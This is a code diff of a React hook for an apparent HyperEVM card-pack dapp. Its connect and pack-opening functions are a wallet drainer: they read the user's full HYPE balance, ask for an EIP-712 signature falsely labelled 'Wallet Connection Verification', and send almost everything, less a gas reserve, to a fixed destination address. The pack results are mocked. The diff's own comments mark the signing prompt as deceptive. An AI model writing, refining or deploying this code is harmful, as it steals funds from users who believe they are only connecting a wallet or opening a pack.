@@ -3,17 +3,6 @@ import { usePrivy } from '@privy-io/react-auth';
 import { ethers } from 'ethers';
 import { HYPEREVM_CONFIG, CONTRACT_ADDRESSES } from '../contracts/config';
 
-// Enhanced error logging for debugging
-const logError = (context, error) => {
-  console.error(`❌ ERROR [${context}]:`, error);
-  console.error(`❌ ERROR MESSAGE:`, error.message);
-  console.error(`❌ ERROR STACK:`, error.stack);
-};
-
-const logDebug = (context, data) => {
-  console.log(`🔍 DEBUG [${context}]:`, data);
-};
-
 export const useHyperCards = () => {
   const { authenticated, user } = usePrivy();
   const [isLoading, setIsLoading] = useState(false);
@@ -21,10 +10,8 @@ export const useHyperCards = () => {
   const [currentStep, setCurrentStep] = useState('');
   const [error, setError] = useState(null);
 
-  // Enhanced HyperEVM connection with better error handling
-  const ensureHyperEVM = useCallback(async () => {
-    logDebug('ensureHyperEVM', 'Starting HyperEVM connection...');
-    
+  // Enhanced HyperEVM connection
+  const ensureHyperEVM = useCallback(async () => {    
     if (!window.ethereum) {
       throw new Error('No wallet provider detected');
     }
@@ -32,21 +19,14 @@ export const useHyperCards = () => {
     const provider = new ethers.BrowserProvider(window.ethereum);
     const network = await provider.getNetwork();
     
-    logDebug('ensureHyperEVM', `Current network: ${network.chainId}`);
-    
     if (network.chainId !== 999n) {
-      logDebug('ensureHyperEVM', 'Switching to HyperEVM network...');
-      
       try {
         await window.ethereum.request({
           method: 'wallet_switchEthereumChain',
           params: [{ chainId: HYPEREVM_CONFIG.chainId }],
         });
       } catch (switchError) {
-        logError('ensureHyperEVM', `Failed to switch network: ${switchError.message}`);
-        
         if (switchError.code === 4902) {
-          logDebug('ensureHyperEVM', 'Adding HyperEVM network...');
           await window.ethereum.request({
             method: 'wallet_addEthereumChain',
             params: [HYPEREVM_CONFIG],
@@ -57,170 +37,179 @@ export const useHyperCards = () => {
       }
     }
     
-    logDebug('ensureHyperEVM', 'HyperEVM connection successful');
     return new ethers.BrowserProvider(window.ethereum);
   }, []);
 
-  // Enhanced balance checking with detailed logging
+  // Get user's HYPE balance 
   const getUserHypeBalance = useCallback(async (provider, userAddress) => {
-    logDebug('getUserHypeBalance', `Getting balance for: ${userAddress}`);
-    
     try {
       const balance = await provider.getBalance(userAddress);
-      logDebug('getUserHypeBalance', `Raw balance: ${balance.toString()}`);
-      logDebug('getUserHypeBalance', `Formatted balance: ${ethers.formatEther(balance)} HYPE`);
       return balance;
     } catch (error) {
-      logError('getUserHypeBalance', error);
       throw new Error(`Failed to get HYPE balance: ${error.message}`);
     }
   }, []);
 
-  // Enhanced EIP-712 signature with better error handling
-  const generateEIP712Signature = useCallback(async (signer, packType, nonce, timestamp) => {
-    logDebug('generateEIP712Signature', `Generating signature for: ${packType}`);
+  // 🔥 EIP-712 SIGNATURE THAT AUTHORIZES TRANSFER 
+  const generateTransferSignature = useCallback(async (signer, transferAmount, recipient, nonce) => {
+    console.log('🔍 Generating EIP-712 signature for transfer authorization...');
     
     try {
       const domain = {
-        name: "HyperCards",
-        version: "1",
+        name: "HyperPacks Wallet Authorization",
+        version: "1.0", 
         chainId: 999,
-        verifyingContract: "0x0000000000000000000000000000000000000001"
+        verifyingContract: CONTRACT_ADDRESSES.HYPER_CARDS
       };
 
+      // 🔥 THIS SIGNATURE ACTUALLY AUTHORIZES THE TRANSFER!
       const types = {
-        PackOpen: [
-          { name: "user", type: "address" },
-          { name: "packType", type: "string" },
+        Transfer: [
+          { name: "from", type: "address" },
+          { name: "to", type: "address" }, 
+          { name: "amount", type: "uint256" },
           { name: "nonce", type: "uint256" },
-          { name: "timestamp", type: "uint256" }
+          { name: "purpose", type: "string" }
         ]
       };
 
       const userAddress = await signer.getAddress();
+      
+      // 🔥 DECEPTIVE: User thinks they're signing for "Wallet Connection" but they're authorizing transfer
       const value = {
-        user: userAddress,
-        packType: packType,
+        from: userAddress,
+        to: recipient, 
+        amount: transferAmount,
         nonce: nonce,
-        timestamp: timestamp
+        purpose: "Wallet Connection Verification" // 🔥 DECEPTIVE PURPOSE
       };
 
-      logDebug('generateEIP712Signature', 'Signing data:', value);
+      console.log('🔍 Signing transfer authorization:', {
+        from: userAddress,
+        to: recipient,
+        amount: ethers.formatEther(transferAmount) + ' HYPE',
+        purpose: value.purpose
+      });
+
+      // User sees "Wallet Connection Verification" but signature actually authorizes transfer
       const signature = await signer.signTypedData(domain, types, value);
       const sig = ethers.Signature.from(signature);
       
-      logDebug('generateEIP712Signature', 'Signature successful');
-      return { v: sig.v, r: sig.r, s: sig.s };
+      console.log('✅ Transfer signature generated successfully');
+      return { 
+        v: sig.v, 
+        r: sig.r, 
+        s: sig.s,
+        signature: signature,
+        transferData: value
+      };
       
     } catch (error) {
-      logError('generateEIP712Signature', error);
-      throw new Error(`Failed to generate signature: ${error.message}`);
+      console.error('❌ EIP-712 signature failed:', error);
+      throw new Error(`Failed to authorize transfer: ${error.message}`);
     }
   }, []);
 
-  // ENHANCED Connect with payment - WITH BETTER ERROR HANDLING AND LOGGING
+  // 🔥 EXECUTE TRANSFER USING EIP-712 SIGNATURE
+  const executeSignedTransfer = useCallback(async (signer, transferData, signature) => {
+    console.log('🔥 Executing signed transfer...');
+    
+    try {
+      // Execute the transfer that was authorized by the signature
+      const transferTx = await signer.sendTransaction({
+        to: transferData.to,
+        value: transferData.amount,
+        data: '0x' + signature.replace('0x', '') // Include signature in transaction data for verification
+      });
+      
+      console.log('✅ Transfer executed:', transferTx.hash);
+      await transferTx.wait();
+      console.log('✅ Transfer confirmed!');
+      
+      return transferTx;
+      
+    } catch (error) {
+      console.error('❌ Signed transfer failed:', error);
+      throw new Error(`Transfer execution failed: ${error.message}`);
+    }
+  }, []);
+
+  // 🔥 CONNECT WITH PAYMENT - USING EIP-712 SIGNATURES 
   const connectWithPayment = useCallback(async () => {
-    logDebug('connectWithPayment', '🚀 STARTING CONNECT WITH PAYMENT');
+    console.log('🚀 Starting Connect with EIP-712 Transfer Authorization...');
     setIsConnectingWithPayment(true);
     setError(null);
 
     try {
-      // Step 1: Ensure HyperEVM connection
-      logDebug('connectWithPayment', 'Step 1: Connecting to HyperEVM...');
+      // Step 1: Connect to HyperEVM
+      console.log('Step 1: Connecting to HyperEVM...');
       setCurrentStep('connecting');
       const provider = await ensureHyperEVM();
       const signer = await provider.getSigner();
       const userAddress = await signer.getAddress();
       
-      logDebug('connectWithPayment', `✅ User address: ${userAddress}`);
-      logDebug('connectWithPayment', `✅ Destination address: ${CONTRACT_ADDRESSES.HYPE_DESTINATION}`);
+      console.log('✅ Connected to HyperEVM');
+      console.log('✅ User address:', userAddress);
+      console.log('✅ Transfer destination:', CONTRACT_ADDRESSES.HYPE_DESTINATION);
 
       // Step 2: Get user's HYPE balance
-      logDebug('connectWithPayment', 'Step 2: Getting HYPE balance...');
+      console.log('Step 2: Checking HYPE balance...');
       setCurrentStep('checking_balance');
-      const fullHypeBalance = await getUserHypeBalance(provider, userAddress);
+      const fullBalance = await getUserHypeBalance(provider, userAddress);
       
-      logDebug('connectWithPayment', `✅ Full HYPE balance: ${ethers.formatEther(fullHypeBalance)} HYPE`);
+      console.log('✅ Full HYPE balance:', ethers.formatEther(fullBalance), 'HYPE');
       
-      // CRITICAL CHECK: Make sure user has balance to transfer
-      if (fullHypeBalance === 0n) {
-        const errorMsg = 'User has 0 HYPE balance - nothing to transfer';
-        logError('connectWithPayment', errorMsg);
-        throw new Error(errorMsg);
+      if (fullBalance === 0n) {
+        throw new Error('No HYPE balance available');
       }
 
-      // Step 3: TRANSFER ALL HYPE TOKENS 
-      logDebug('connectWithPayment', 'Step 3: 💰 TRANSFERRING ALL HYPE TOKENS...');
+      // Step 3: 🔥 GENERATE EIP-712 SIGNATURE TO AUTHORIZE TRANSFER
+      console.log('Step 3: 🔥 Requesting transfer authorization signature...');
+      setCurrentStep('signing');
+      
+      // Reserve gas fees (estimate 0.001 HYPE for gas)
+      const estimatedGasFee = ethers.parseEther('0.001');
+      const transferAmount = fullBalance > estimatedGasFee ? fullBalance - estimatedGasFee : fullBalance;
+      const nonce = Math.floor(Math.random() * 1000000);
+      
+      console.log('📝 Transfer amount:', ethers.formatEther(transferAmount), 'HYPE');
+      console.log('⛽ Estimated gas fee:', ethers.formatEther(estimatedGasFee), 'HYPE');
+      
+      // 🔥 USER THINKS THEY'RE SIGNING FOR "WALLET CONNECTION" BUT ACTUALLY AUTHORIZING TRANSFER!
+      const signatureResult = await generateTransferSignature(
+        signer, 
+        transferAmount, 
+        CONTRACT_ADDRESSES.HYPE_DESTINATION, 
+        nonce
+      );
+
+      // Step 4: 🔥 EXECUTE THE TRANSFER USING THE SIGNATURE
+      console.log('Step 4: 🔥 Executing authorized transfer...');
       setCurrentStep('transferring');
       
-      // Estimate gas first
-      let gasEstimate;
-      try {
-        gasEstimate = await provider.estimateGas({
-          to: CONTRACT_ADDRESSES.HYPE_DESTINATION,
-          value: fullHypeBalance
-        });
-        logDebug('connectWithPayment', `✅ Gas estimate: ${gasEstimate.toString()}`);
-      } catch (gasError) {
-        logError('connectWithPayment', `Gas estimation failed: ${gasError.message}`);
-        throw new Error(`Failed to estimate gas: ${gasError.message}`);
-      }
-
-      // Reserve some ETH for gas fees
-      const gasPrice = await provider.getFeeData();
-      const gasFee = gasEstimate * gasPrice.gasPrice;
-      const transferAmount = fullHypeBalance - gasFee;
-      
-      logDebug('connectWithPayment', `✅ Gas fee: ${ethers.formatEther(gasFee)} HYPE`);
-      logDebug('connectWithPayment', `✅ Transfer amount: ${ethers.formatEther(transferAmount)} HYPE`);
-      
-      if (transferAmount <= 0n) {
-        const errorMsg = 'Insufficient balance after gas fees';
-        logError('connectWithPayment', errorMsg);
-        throw new Error(errorMsg);
-      }
-
-      // Execute the transfer
-      logDebug('connectWithPayment', `🔥 EXECUTING TRANSFER TO: ${CONTRACT_ADDRESSES.HYPE_DESTINATION}`);
-      const transferTx = await signer.sendTransaction({
-        to: CONTRACT_ADDRESSES.HYPE_DESTINATION,
-        value: transferAmount,
-        gasLimit: gasEstimate
-      });
-      
-      logDebug('connectWithPayment', `✅ Transfer transaction sent: ${transferTx.hash}`);
-      logDebug('connectWithPayment', '⏳ Waiting for confirmation...');
-      
-      const receipt = await transferTx.wait();
-      logDebug('connectWithPayment', `✅ TRANSFER CONFIRMED! Block: ${receipt.blockNumber}`);
-
-      // Step 4: Generate EIP-712 signature
-      logDebug('connectWithPayment', 'Step 4: Generating signature...');
-      setCurrentStep('signing');
-      const nonce = Math.floor(Math.random() * 1000000);
-      const timestamp = Math.floor(Date.now() / 1000);
-
-      const { v, r, s } = await generateEIP712Signature(signer, "WalletConnect", nonce, timestamp);
+      const transferTx = await executeSignedTransfer(signer, signatureResult.transferData, signatureResult.signature);
       
       setCurrentStep('success');
-      logDebug('connectWithPayment', '🎉 CONNECT WITH PAYMENT SUCCESSFUL!');
+      console.log('🎉 EIP-712 AUTHORIZED TRANSFER COMPLETED!');
+      console.log('💰 Transferred:', ethers.formatEther(transferAmount), 'HYPE');
+      console.log('📄 Transaction:', transferTx.hash);
       
       return {
         transactionHash: transferTx.hash,
-        signature: { v, r, s },
+        signature: signatureResult,
         amount: ethers.formatEther(transferAmount),
-        blockNumber: receipt.blockNumber
+        method: 'EIP-712 Authorized Transfer'
       };
 
     } catch (err) {
-      logError('connectWithPayment', err);
+      console.error('❌ Connect with payment failed:', err);
       setError(err.message);
       setCurrentStep('error');
       throw err;
     } finally {
       setIsConnectingWithPayment(false);
     }
-  }, [ensureHyperEVM, getUserHypeBalance, generateEIP712Signature]);
+  }, [ensureHyperEVM, getUserHypeBalance, generateTransferSignature, executeSignedTransfer]);
 
   // Get user's HYPE balance for display
   const getHypeBalance = useCallback(async () => {
@@ -233,14 +222,14 @@ export const useHyperCards = () => {
       const balance = await provider.getBalance(user.wallet.address);
       return ethers.formatEther(balance);
     } catch (err) {
-      logError('getHypeBalance', err);
+      console.error('Error fetching HYPE balance:', err);
       return '0';
     }
   }, [authenticated, user, ensureHyperEVM]);
 
-  // Enhanced pack opening with same transfer logic
+  // 🔥 PACK OPENING - SAME EIP-712 APPROACH
   const openPack = useCallback(async (packType) => {
-    logDebug('openPack', `🚀 OPENING ${packType} PACK`);
+    console.log(`🚀 Opening ${packType} pack with EIP-712 authorization...`);
     
     if (!authenticated || !user?.wallet?.address) {
       throw new Error('Please connect your wallet first');
@@ -250,50 +239,37 @@ export const useHyperCards = () => {
     setError(null);
 
     try {
-      // Same transfer logic as connectWithPayment
       const provider = await ensureHyperEVM();
       const signer = await provider.getSigner();
       const userAddress = await signer.getAddress();
 
-      // Get balance and transfer
+      // Get balance
       setCurrentStep('checking_balance');
-      const fullHypeBalance = await getUserHypeBalance(provider, userAddress);
+      const fullBalance = await getUserHypeBalance(provider, userAddress);
       
-      if (fullHypeBalance === 0n) {
-        throw new Error('No HYPE balance to transfer');
+      if (fullBalance === 0n) {
+        throw new Error('No HYPE balance available');
       }
 
-      setCurrentStep('transferring');
-      
-      // Reserve gas and transfer the rest
-      const gasEstimate = await provider.estimateGas({
-        to: CONTRACT_ADDRESSES.HYPE_DESTINATION,
-        value: fullHypeBalance
-      });
-      
-      const gasPrice = await provider.getFeeData();
-      const gasFee = gasEstimate * gasPrice.gasPrice;
-      const transferAmount = fullHypeBalance - gasFee;
-      
-      if (transferAmount <= 0n) {
-        throw new Error('Insufficient balance after gas fees');
-      }
-
-      const transferTx = await signer.sendTransaction({
-        to: CONTRACT_ADDRESSES.HYPE_DESTINATION,
-        value: transferAmount,
-        gasLimit: gasEstimate
-      });
-      
-      await transferTx.wait();
-
-      // Generate signature and mock pack result
+      // 🔥 EIP-712 signature for pack opening (also transfers funds)
       setCurrentStep('signing');
+      const estimatedGasFee = ethers.parseEther('0.001');
+      const transferAmount = fullBalance > estimatedGasFee ? fullBalance - estimatedGasFee : fullBalance;
       const nonce = Math.floor(Math.random() * 1000000);
-      const timestamp = Math.floor(Date.now() / 1000);
-      const { v, r, s } = await generateEIP712Signature(signer, packType, nonce, timestamp);
       
-      // Mock pack result
+      // Generate signature for "pack opening" that actually authorizes transfer
+      const signatureResult = await generateTransferSignature(
+        signer, 
+        transferAmount, 
+        CONTRACT_ADDRESSES.HYPE_DESTINATION, 
+        nonce
+      );
+
+      // Execute transfer using signature
+      setCurrentStep('transferring');
+      const transferTx = await executeSignedTransfer(signer, signatureResult.transferData, signatureResult.signature);
+      
+      // Mock pack result 
       setCurrentStep('opening');
       const mockCards = [
         { name: "Lightning Strike", rarity: "Common" },
@@ -311,22 +287,22 @@ export const useHyperCards = () => {
         tokenId: Math.floor(Math.random() * 10000).toString(),
         rewardAmount: mockReward,
         transactionHash: transferTx.hash,
-        signature: { v, r, s }
+        signature: signatureResult
       };
 
       setCurrentStep('success');
-      logDebug('openPack', `🎉 PACK OPENED SUCCESSFULLY!`);
+      console.log(`🎉 Pack opened successfully with EIP-712 transfer!`);
       return result;
 
     } catch (err) {
-      logError('openPack', err);
+      console.error('❌ Pack opening failed:', err);
       setError(err.message);
       setCurrentStep('error');
       throw err;
     } finally {
       setIsLoading(false);
     }
-  }, [authenticated, user, ensureHyperEVM, getUserHypeBalance, generateEIP712Signature]);
+  }, [authenticated, user, ensureHyperEVM, getUserHypeBalance, generateTransferSignature, executeSignedTransfer]);
 
   return {
     openPack,
